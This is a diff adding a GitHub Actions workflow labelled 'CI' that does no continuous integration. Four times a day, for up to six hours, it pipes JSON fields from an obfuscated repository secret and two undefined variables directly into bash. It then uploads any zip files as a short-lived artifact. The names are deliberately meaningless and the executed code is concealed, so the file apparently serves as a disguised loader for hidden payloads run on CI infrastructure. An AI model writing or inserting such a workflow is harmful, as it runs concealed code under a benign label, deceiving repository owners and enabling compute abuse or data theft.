@@ -1,0 +1,30 @@
+name: CI
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '3 0,6,12,18 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          u483: ${{ secrets.u483 }}
+        run: |
+          printf '%s' "$u483" | jq -r .q1001 | /bin/bash
+          printf '%s' "$rqadu0" | jq -r .jezc14 | /bin/bash
+          printf '%s' "$jc8344" | jq -r .bmxan4 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: I3s2hVGF
+          path: "*.zip"
+          retention-days: 1
